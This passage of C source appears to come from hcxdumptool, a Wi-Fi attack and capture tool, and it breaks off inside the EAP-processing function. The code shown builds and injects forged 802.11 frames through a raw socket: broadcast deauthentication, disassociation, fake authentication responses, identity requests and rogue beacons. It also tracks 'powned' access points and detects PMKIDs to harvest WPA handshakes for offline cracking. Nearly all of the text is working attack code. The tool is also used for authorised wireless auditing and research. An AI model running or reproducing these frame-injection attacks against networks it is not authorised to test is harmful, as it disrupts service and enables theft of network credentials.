#define _GNU_SOURCE
#include <ctype.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdbool.h>
#include <getopt.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <limits.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#ifdef __ANDROID__
#include <libgen.h>
#define strdupa strdup
#include "include/android-ifaddrs/ifaddrs.h"
#include "include/android-ifaddrs/ifaddrs.c"
#else
#include <ifaddrs.h>
#endif
#include <net/if.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>  
#include <net/if.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <pthread.h>

#ifdef DOGPIOSUPPORT
#include <wiringPi.h>
#endif

#include "include/version.h"
#include "include/wireless-lite.h"
#include "include/hcxdumptool.h"
#include "include/byteops.c"
#include "include/ieee80211.c"
#include "include/pcap.c"
#include "include/strings.c"
#include "include/hashops.c"
/*===========================================================================*/
/* global var */

static int fd_socket;
static int fd_pcapng;
static int fd_ippcapng;
static int fd_weppcapng;

static maclist_t *filterlist;
static int filterlist_len;

maclist_t *beaconlist;
macessidlist_t *proberequestlist;
macessidlist_t *proberesponselist;
macessidlist_t *myproberesponselist;
macmaclist_t *pownedlist;

static enhanced_packet_block_t *epbhdr;

static uint8_t *packet_ptr;
static int packet_len;
static uint8_t *ieee82011_ptr;
static int ieee82011_len;
static mac_t *macfrx;

static uint8_t *payload_ptr;
static int payload_len;

static uint8_t *llc_ptr;
static llc_t *llc;

static uint8_t *mpdu_ptr;
static mpdu_t *mpdu;

static uint8_t statusout;

static int errorcount;
static int maxerrorcount;

static unsigned long long int incommingcount;
static unsigned long long int outgoingcount;
static unsigned long long int droppedcount;
static unsigned long long int pownedcount;

static bool wantstopflag;
static bool poweroffflag;
static bool channelchangedflag;
static bool activescanflag;
static bool deauthenticationflag;
static bool disassociationflag;
static bool attackapflag;
static bool attackclientflag;

static int filtermode;
static int eapoltimeout;
static int deauthenticationintervall;
static int deauthenticationsmax;
static int apattacksintervall;
static int apattacksmax;
static int staytime;
static uint8_t cpa;

static uint32_t myouiap;
static uint32_t mynicap;
static uint32_t myouista;
static uint32_t mynicsta;

static uint64_t timestamp;
static uint64_t timestampstart;

struct timeval tv;
static uint64_t mytime;

static int mydisassociationsequence;
static int myidrequestsequence;
static int mydeauthenticationsequence;
static int mybeaconsequence;
static int myproberequestsequence;
static int myauthenticationrequestsequence;
static int myauthenticationresponsesequence;
static int myassociationrequestsequence;
static int myassociationresponsesequence;
static int myproberesponsesequence;

static char *interfacename;
static char *pcapngoutname;
static char *ippcapngoutname;
static char *weppcapngoutname ;
static char *filterlistname;


static const uint8_t hdradiotap[] =
{
/* now we are running hardware handshake */
0x00, 0x00,
0x08, 0x00,
0x00, 0x00,
0x00, 0x00
};
#define HDRRT_SIZE sizeof(hdradiotap)

static uint8_t channeldefaultlist[] =
{
1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
34, 36, 38, 40, 42, 44, 46, 48, 52, 56, 58, 60, 62, 64,
100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 147, 149, 151, 153, 155, 157,
161, 165, 167, 169, 184, 188, 192, 196, 200, 204, 208, 212, 216,
0
};

static uint8_t channelscanlist[128] =
{
1, 3, 5, 7, 9, 11, 13, 2, 4, 6, 8, 10, 12, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
};


static uint8_t mac_orig[6];
static uint8_t mac_mysta[6];
static uint8_t mac_mybcap[6];

static unsigned long long int rcrandom;
static uint8_t anoncerandom[32];

uint64_t lasttimestampm1;
uint8_t laststam1[6];
uint8_t lastapm1[6];
uint64_t lastrcm1;

uint64_t lasttimestampm2;
uint8_t laststam2[6];
uint8_t lastapm2[6];
uint64_t lastrcm2;

uint64_t lasttimestampm2al;
uint8_t laststam2al[6];
uint8_t lastapm2al[6];
uint64_t lastrcm2al;

uint8_t assocmacap[6];
uint8_t assocmacsta[6];

static uint8_t epb[PCAPNG_MAXSNAPLEN *2];
/*===========================================================================*/
/*===========================================================================*/
static inline void debugprint(int len, uint8_t *ptr)
{
static int p;

for(p = 0; p < len; p++)
	{
	printf("%02x", ptr[p]);
	}
printf("\n\n");
return;
}
/*===========================================================================*/
__attribute__ ((noreturn))
static void globalclose()
{
if(fd_socket > 0)
	{
	if(close(fd_socket) != 0)
		{
		perror("failed to close rx socket");
		}
	}
if(fd_weppcapng > 0)
	{
	writeisb(fd_weppcapng, 0, timestampstart, incommingcount);
	if(fsync(fd_weppcapng) != 0)
		{
		perror("failed to sync wep pcapng file");
		}
	if(close(fd_weppcapng) != 0)
		{
		perror("failed to close wep pcapng file");
		}
	}
if(fd_ippcapng > 0)
	{
	writeisb(fd_ippcapng, 0, timestampstart, incommingcount);
	if(fsync(fd_ippcapng) != 0)
		{
		perror("failed to sync ip pcapng file");
		}
	if(close(fd_ippcapng) != 0)
		{
		perror("failed to close ip pcapng file");
		}
	}
if(fd_pcapng > 0)
	{
	writeisb(fd_pcapng, 0, timestampstart, incommingcount);
	if(fsync(fd_pcapng) != 0)
		{
		perror("failed to sync pcapng file");
		}
	if(close(fd_pcapng) != 0)
		{
		perror("failed to close pcapng file");
		}
	}

if(filterlist != NULL)
	{
	free(filterlist);
	}

if(beaconlist != NULL)
	{
	free(beaconlist);
	}

if(proberequestlist != NULL)
	{
	free(proberequestlist);
	}

if(proberesponselist != NULL)
	{
	free(proberesponselist);
	}

if(myproberesponselist != NULL)
	{
	free(myproberesponselist);
	}

if(pownedlist != NULL)
	{
	free(pownedlist);
	}

printf("\nterminated...\e[?25h\n");
if(poweroffflag == true)
	{
	if(system("poweroff") != 0)
		printf("can't power off\n");
	}
exit(EXIT_SUCCESS);
}
/*===========================================================================*/
static inline void printtargets()
{
int c;
maclist_t *zeiger;

if(payload_len < (int)CAPABILITIESAP_SIZE)
	{
	return;
	}
if(memcmp(&mac_mybcap, macfrx->addr2, 6) == 0)
	{
	return;
	}

zeiger = beaconlist;
for(c = 0; c < BEACONLIST_MAX -1; c++)
	{
	if(memcmp(zeiger->addr, &mac_null, 6) == 0)
		{
		break;
		}
	if(memcmp(zeiger->addr, macfrx->addr2, 6) == 0)
		{
		zeiger->count ++;
		return;
		}
	zeiger++;
	}

zeiger->timestamp = timestamp;
zeiger->status = 0;
zeiger->count = 0;
memcpy(zeiger->addr, macfrx->addr2, 6);
qsort(beaconlist, c +1, MACLIST_SIZE, sort_maclist_by_time);
return;
}
/*===========================================================================*/
static inline void printtimenet(uint8_t *mac_to, uint8_t *mac_from)
{
static int p;
static char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
fprintf(stdout, "\33[2K\r[%s - %03d] ", timestring, channelscanlist[cpa]);

for(p = 0; p< 6; p++)
	{
	fprintf(stdout, "%02x", mac_from[p]);
	}
fprintf(stdout, " -> ");
for(p = 0; p< 6; p++)
	{
	fprintf(stdout, "%02x", mac_to[p]);
	}
return;
}
/*===========================================================================*/
static inline void printessid(uint8_t *tag_ptr)
{
static int p;
static ietag_t *essidtag;

essidtag = (ietag_t*)tag_ptr;
if(isasciistring(essidtag->len, essidtag->data) != false)
	{
	fprintf(stdout, " %.*s", essidtag->len, essidtag->data);
	}
else
	{
	fprintf(stdout, " $HEX[");
	for(p = 0; p < essidtag->len; p++)
		{
		fprintf(stdout, "%02x", essidtag->data[p]);
		}
	fprintf(stdout, "]");
	}
return;
}
/*===========================================================================*/
static inline void printid(uint16_t idlen, uint8_t *id)
{
static int p;

if(id[0] == 0)
	{
	return;
	}
if(isasciistring(idlen, id) != false)
	{
	fprintf(stdout, " %.*s", idlen, id);
	}
else
	{
	fprintf(stdout, " $HEX[");
	for(p = 0; p < idlen; p++)
		{
		fprintf(stdout, "%02x", id[p]);
		}
	fprintf(stdout, "]");
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static void writeepbm2(int fd)
{
static int epblen;
static int written;
static uint16_t padding;
static total_length_t *totallenght;

static char aplesscomment[] = {"HANDSHAKE AP-LESS" };
#define APLESSCOMMENT_SIZE sizeof(aplesscomment)

epbhdr = (enhanced_packet_block_t*)epb;
epblen = EPB_SIZE;
epbhdr->block_type = EPBBID;
epbhdr->interface_id = 0;
epbhdr->cap_len = packet_len;
epbhdr->org_len = packet_len;
epbhdr->timestamp_high = timestamp >> 32;
epbhdr->timestamp_low = (uint32_t)timestamp;
padding = 0;
if((epbhdr->cap_len % 4))
	{
	 padding = 4 -(epbhdr->cap_len % 4);
	}
epblen += packet_len;
memset(&epb[epblen], 0, padding);
epblen += padding;
epblen += addoption(epb +epblen, SHB_COMMENT, APLESSCOMMENT_SIZE, aplesscomment);
epblen += addoption(epb +epblen, 62109, 32, (char*)anoncerandom);
epblen += addoption(epb +epblen, SHB_EOC, 0, NULL);
totallenght = (total_length_t*)(epb +epblen);
epblen += TOTAL_SIZE;
epbhdr->total_length = epblen;
totallenght->total_length = epblen;

written = write(fd, &epb, epblen);
if(written != epblen)
	{
	errorcount++;
	}
return;	
}
/*===========================================================================*/
static void writeepb(int fd)
{
static int epblen;
static int written;
static uint16_t padding;
static total_length_t *totallenght;

epbhdr = (enhanced_packet_block_t*)epb;
epblen = EPB_SIZE;
epbhdr->block_type = EPBBID;
epbhdr->interface_id = 0;
epbhdr->cap_len = packet_len;
epbhdr->org_len = packet_len;
epbhdr->timestamp_high = timestamp >> 32;
epbhdr->timestamp_low = (uint32_t)timestamp;
padding = 0;
if((epbhdr->cap_len % 4))
	{
	 padding = 4 -(epbhdr->cap_len % 4);
	}
epblen += packet_len;
memset(&epb[epblen], 0, padding);
epblen += padding;
totallenght = (total_length_t*)(epb +epblen);
epblen += TOTAL_SIZE;
epbhdr->total_length = epblen;
totallenght->total_length = epblen;

written = write(fd, &epb, epblen);
if(written != epblen)
	{
	errorcount++;
	}
return;	
}
/*===========================================================================*/
/*===========================================================================*/
static inline uint8_t *gettag(uint8_t tag, uint8_t *tagptr, int restlen)
{
static ietag_t *tagfield;

while(0 < restlen)
	{
	tagfield = (ietag_t*)tagptr;
	if(tagfield->id == tag)
		{
		if(restlen >= (int)tagfield->len +(int)IETAG_SIZE)
			{
			return tagptr;
			}
		else
			{
			return NULL;
			}
		}
	tagptr += tagfield->len +IETAG_SIZE;
	restlen -= tagfield->len +IETAG_SIZE;
	}
return NULL;
}
/*===========================================================================*/
static inline bool checkfilterlistentry(uint8_t *filtermac)
{
static int c;
static maclist_t * zeiger;


zeiger = filterlist;
for(c = 0; c < filterlist_len; c++)
	{
	if(memcmp(zeiger->addr, filtermac, 6) == 0)
		{
		return true;
		}
	zeiger++;
	}

return false;
}
/*===========================================================================*/
static inline bool checkpownedap(uint8_t *macap)
{
int c;
macmaclist_t *zeiger;

zeiger = pownedlist;
for(c = 0; c < POWNEDLIST_MAX -1; c++)
	{
	if(memcmp(zeiger->addr2, &mac_null, 6) == 0)
		{
		return false;
		}
	if(memcmp(zeiger->addr2, macap, 6) == 0)
		{
		return true;
		}
	zeiger++;
	}
return false;
}
/*===========================================================================*/
static inline bool checkpownedstaap(uint8_t *pownedmacsta, uint8_t *pownedmacap)
{
int c;
macmaclist_t *zeiger;

zeiger = pownedlist;
for(c = 0; c < POWNEDLIST_MAX -1; c++)
	{
	if(memcmp(zeiger->addr2, &mac_null, 6) == 0)
		{
		return false;
		}
	if((memcmp(zeiger->addr1, pownedmacsta, 6) == 0) && (memcmp(zeiger->addr2, pownedmacap, 6) == 0))
		{
		return true;
		}
	zeiger++;
	}
return false;
}
/*===========================================================================*/
static inline bool addpownedstaap(uint8_t *pownedmacsta, uint8_t *pownedmacap, uint8_t status)
{
int c;
macmaclist_t *zeiger;

zeiger = pownedlist;
for(c = 0; c < POWNEDLIST_MAX -1; c++)
	{
	if(memcmp(zeiger->addr2, &mac_null, 6) == 0)
		{
		break;
		}
	if((memcmp(zeiger->addr1, pownedmacsta, 6) == 0) && (memcmp(zeiger->addr2, pownedmacap, 6) == 0))
		{
		if((zeiger->status & status) == status)
			{
			return true;
			}
		zeiger->status |= status;
		pownedcount++;
		return false;
		}
	zeiger++;
	}
zeiger->timestamp = timestamp;
zeiger->status |= status;
memcpy(zeiger->addr1, pownedmacsta, 6);
memcpy(zeiger->addr2, pownedmacap, 6);
pownedcount++;
qsort(pownedlist, c +1, MACMACLIST_SIZE, sort_macmaclist_by_time);
return false;
}
/*===========================================================================*/
static void send_requestidentity()
{
static mac_t *macftx;
const uint8_t requestidentitydata[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x01, 0x00, 0x00, 0x0a, 0x01, 0x63, 0x00, 0x0a, 0x01, 0x68, 0x65, 0x6c, 0x6c, 0x6f
};
#define REQUESTIDENTITY_SIZE sizeof(requestidentitydata)

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macfrx->addr2) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macfrx->addr2) == false))
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_QOS +REQUESTIDENTITY_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_QOS_DATA;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->from_ds = 1;
macftx->duration = 0x002c;
macftx->sequence = myidrequestsequence++ << 4;
if(myidrequestsequence >= 4096)
	{
	myidrequestsequence = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_QOS], &requestidentitydata, REQUESTIDENTITY_SIZE);
if(send(fd_socket, packetout,  HDRRT_SIZE +MAC_SIZE_QOS +REQUESTIDENTITY_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static void send_disassociation(uint8_t reason)
{
static mac_t *macftx;

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macfrx->addr2) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macfrx->addr2) == false))
	{
	return;
	}
if(checkpownedstaap(macfrx->addr2, macfrx->addr1) == true)
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DISASSOC;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = mydisassociationsequence++ << 4;
if(mydisassociationsequence >= 4096)
	{
	mydisassociationsequence = 0;
	}
packetout[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
if(send(fd_socket, packetout,  HDRRT_SIZE +MAC_SIZE_NORM +2, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static void send_broadcast_deauthentication(uint8_t reason)
{
static mac_t *macftx;

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macfrx->addr2) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macfrx->addr2) == false))
	{
	return;
	}
if(checkpownedap(macfrx->addr2) == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DEAUTH;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, macfrx->addr2, 6);
memcpy(macftx->addr3, macfrx->addr2, 6);
macftx->duration = 0x013a;
macftx->sequence = mydeauthenticationsequence++ << 4;
if(mydeauthenticationsequence >= 4096)
	{
	mydeauthenticationsequence = 0;
	}
packetout[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
if(send(fd_socket, packetout,  HDRRT_SIZE +MAC_SIZE_NORM +2, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_authenticationresponseopensystem()
{
static mac_t *macftx;

const uint8_t authenticationresponsedata[] =
{
0x00, 0x00, 0x02, 0x00, 0x00, 0x00
};
#define AUTHENTICATIONRESPONSE_SIZE sizeof(authenticationresponsedata)

uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macfrx->addr2) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macfrx->addr2) == false))
	{
	return;
	}
if(checkpownedstaap(macfrx->addr1, macfrx->addr2) == true)
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +AUTHENTICATIONRESPONSE_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr2, 6);
macftx->duration = 0x013a;
macftx->sequence = myauthenticationrequestsequence++ << 4;
if(myauthenticationrequestsequence >= 4096)
	{
	myauthenticationrequestsequence = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationresponsedata, AUTHENTICATIONRESPONSE_SIZE);
if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +AUTHENTICATIONRESPONSE_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_authenticationrequestopensystem()
{
static mac_t *macftx;

const uint8_t authenticationrequestdata[] =
{
0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
};
#define MYAUTHENTICATIONREQUEST_SIZE sizeof(authenticationrequestdata)

uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macfrx->addr2) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macfrx->addr2) == false))
	{
	return;
	}
if(checkpownedstaap(macfrx->addr1, macfrx->addr2) == true)
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr2, 6);
macftx->duration = 0x013a;
macftx->sequence = myauthenticationrequestsequence++ << 4;
if(myauthenticationrequestsequence >= 4096)
	{
	myauthenticationrequestsequence = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationrequestdata, MYAUTHENTICATIONREQUEST_SIZE);
if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_directed_proberequest()
{
static mac_t *macftx;
static uint8_t *beaconptr;
static int beaconlen;
static uint8_t *essidtagptr;
static ietag_t *essidtag;

const uint8_t directedproberequestdata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x92, 0x98, 0xa4,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c
};
#define DIRECTEDPROBEREQUEST_SIZE sizeof(directedproberequestdata)

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macfrx->addr2) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macfrx->addr2) == false))
	{
	return;
	}
if(checkpownedstaap(mac_mysta, macfrx->addr2) == true)
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +DIRECTEDPROBEREQUEST_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, &mac_mysta, 6);
memcpy(macftx->addr3, macfrx->addr2, 6);
macftx->sequence = myproberequestsequence++ << 4;
if(myproberequestsequence >= 4096)
	{
	myproberequestsequence= 0;
	}

beaconptr = payload_ptr +CAPABILITIESAP_SIZE;
beaconlen = payload_len -CAPABILITIESAP_SIZE;

essidtagptr = gettag(TAG_SSID, beaconptr, beaconlen);
if(essidtagptr == NULL)
	{
	return;
	}
essidtag = (ietag_t*)essidtagptr;
if(essidtag->len > ESSID_LEN_MAX)
	{
	return;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], essidtagptr, essidtag->len +IETAG_SIZE);
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +essidtag->len +IETAG_SIZE], &directedproberequestdata, DIRECTEDPROBEREQUEST_SIZE);
if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +essidtag->len +IETAG_SIZE +DIRECTEDPROBEREQUEST_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_undirected_proberequest()
{
static mac_t *macftx;

const uint8_t undirectedproberequestdata[] =
{
0x00, 0x00,
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x92, 0x98, 0xa4,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c
};
#define UNDIRECTEDPROBEREQUEST_SIZE sizeof(undirectedproberequestdata)

static uint8_t packetout[1024];

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +UNDIRECTEDPROBEREQUEST_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &mac_mysta, 6);
memcpy(macftx->addr3, &mac_broadcast, 6);
macftx->sequence = myproberequestsequence++ << 4;
if(myproberequestsequence >= 4096)
	{
	myproberequestsequence= 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &undirectedproberequestdata, UNDIRECTEDPROBEREQUEST_SIZE);
if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +UNDIRECTEDPROBEREQUEST_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static void send_broadcastbeacon()
{
mac_t *macftx;
capap_t *capap;

const uint8_t broadcastbeacondata[] =
{
0x00, 0x00,
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
0x03, 0x01, 0x0d,
0x05, 0x04, 0x00, 0x01, 0x00, 0x00,
0x2a, 0x01, 0x00,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xef, 0x11, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00, 
0x3d, 0x16, 0x0d, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff, 0x7f,
0xdd, 0x0c, 0x00, 0x04, 0x0e, 0x01, 0x01, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02,
0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01, 0x20
};
#define BROADCASTBEACON_SIZE sizeof(broadcastbeacondata)

uint8_t packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BROADCASTBEACON_SIZE +1];

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BROADCASTBEACON_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &mac_mybcap, 6);
memcpy(macftx->addr3, &mac_mybcap, 6);
macftx->sequence = mybeaconsequence++ << 4;
if(mybeaconsequence >= 4096)
	{
	mybeaconsequence = 0;
	}
capap = (capap_t*)(packetout +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = 0x64;
capap->capabilities = 0x431;
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE], &broadcastbeacondata, BROADCASTBEACON_SIZE);
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +0x0e] = channelscanlist[cpa];

if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BROADCASTBEACON_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline bool addproberequest(uint8_t *macsta, uint8_t essidlen, uint8_t *essiddata)
{
static int c;
static macessidlist_t *zeiger;

zeiger = proberequestlist;
for(c = 0; c < PROBEREQUESTLIST_MAX -1; c++)
	{
	if(memcmp(zeiger->addr, &mac_null, 6) == 0)
		{
		c++;
		break;
		}
	if((memcmp(zeiger->addr, macsta, 6) == 0) && (zeiger->essid_len == essidlen) && (memcmp(zeiger->essid, essiddata, essidlen) == 0))
		{
		zeiger->timestamp = timestamp;
		return true;
		}
	zeiger++;
	}
zeiger->timestamp = timestamp;
memcpy(zeiger->addr, macsta, 6);
zeiger->essid_len = essidlen;
memset(zeiger->essid, 0, 32);
memcpy(zeiger->essid, essiddata, essidlen);
qsort(proberequestlist, c +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return false;
}
/*===========================================================================*/
static inline bool detectpmkid(uint16_t authlen, uint8_t *authpacket)
{
pmkid_t *pmkid;

if(authlen < WPAKEY_SIZE +PMKID_SIZE)
	{
	return false;
	}
pmkid = (pmkid_t*)(authpacket +WPAKEY_SIZE);

if((pmkid->id != 0xdd) && (pmkid->id != 0x14))
	{
	return false;
	}
if((pmkid->oui[0] != 0x00) && (pmkid->oui[1] != 0x0f) && (pmkid->oui[2] != 0xac))
	{
	return false;
	}
if(pmkid->type != 0x04)
	{
	return false;
	}

if(memcmp(pmkid->pmkid, &nulliv, 16) == 0)
	{
	return false;
	}
return true;
}
/*===========================================================================*/
static inline void process80211eap()
{
static uint8_t *eapauthptr;
static eapauth_t *eapauth;
static int eapauthlen;
static uint16_t authlen;
static wpakey_t *wpak;
static uint16_t keyinfo;
static unsigned long long int rc;
int calceapoltimeout;

static exteap_t *exteap;
